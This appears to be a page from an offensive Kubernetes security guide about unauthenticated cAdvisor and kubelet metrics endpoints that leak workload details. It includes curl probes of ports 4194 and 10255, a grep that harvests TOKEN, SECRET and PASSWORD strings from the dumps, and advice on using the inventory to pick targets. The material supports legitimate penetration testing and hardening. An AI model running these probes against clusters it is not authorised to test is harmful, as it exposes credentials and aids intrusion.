---
title: "cAdvisor and metrics: environment and topology leaks from stats endpoints"
order: 6
description: "cAdvisor and the various metrics endpoints expose per-container statistics and metadata. Where reachable without authentication, they leak container names, images, labels, and sometimes environment variables and command lines, giving an attacker a map of the cluster's workloads and occasionally secrets passed as container arguments or environment."
keywords:
  - cadvisor
  - metrics
  - port 4194
  - container stats
  - information disclosure
---

# cAdvisor and metrics

cAdvisor collects resource statistics for every container and historically served them on port 4194; the kubelet also exposes `/metrics`, `/metrics/cadvisor`, and `/stats` endpoints, and clusters run metrics-server and Prometheus exporters. These are monitoring surfaces, but when reachable without authentication they disclose a detailed map of what runs where: container names, images, pod and namespace labels, and resource usage. Some expose container command lines and environment, which can include secrets passed as arguments or variables.

Probe the endpoints:

```bash
# legacy cAdvisor UI/API
curl -s http://<node>:4194/api/v1.3/containers/ | python3 -m json.tool | head -60
# kubelet-exposed cAdvisor metrics (via read-only port or the kubelet)
curl -s http://<node>:10255/metrics/cadvisor | head
curl -s http://<node>:10255/stats/summary | python3 -m json.tool | head
```

## What leaks

```bash
# container specs include labels, images, and sometimes env/args
curl -s http://<node>:4194/api/v1.3/containers/ | \
  grep -iE 'image|namespace|env|argv|TOKEN|SECRET|PASSWORD'
# the topology alone maps every workload, aiding target selection
```

## Exploitation notes

- Treat these as reconnaissance: they rarely give execution, but they reveal the full workload inventory (images, namespaces, labels), which guides where to aim the RBAC and pod-escape routes.
- Environment variables or command-line arguments surfaced in container metadata occasionally contain credentials passed insecurely; grep the dumps for secret-like strings.
- These endpoints are often left open on the node network even when the main APIs are locked down, so they are a useful low-friction first look at an otherwise hardened cluster.

## References

- [cAdvisor](https://github.com/google/cadvisor)
- [Kubernetes: kubelet metrics endpoints](https://kubernetes.io/docs/reference/instrumentation/metrics/)
- [kube-hunter: cAdvisor](https://aquasecurity.github.io/kube-hunter/)
